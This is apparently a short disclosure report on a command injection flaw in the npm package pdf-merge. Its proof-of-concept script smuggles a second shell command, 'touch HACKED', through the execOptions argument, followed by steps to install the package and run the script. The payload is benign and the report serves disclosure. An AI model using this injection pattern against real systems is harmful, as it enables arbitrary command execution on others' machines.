# Description

The issue occurs because a `user input` is formatted inside a `command` that will be executed without any checks, leading to `arbitrary command injection`


# POC

1. Create the following PoC file:

```js
// poc.js
const PDFMerge = require('pdf-merge');
 
const files = [
    `1.pdf`,
    `2.pdf`,
    {file: `protected.pdf`, inputPw: '_SeCrEt_'}
];
 
//Buffer (Default)
PDFMerge(files, {execOptions: 'test; touch HACKED; #'})

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i pdf-merge # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created :)
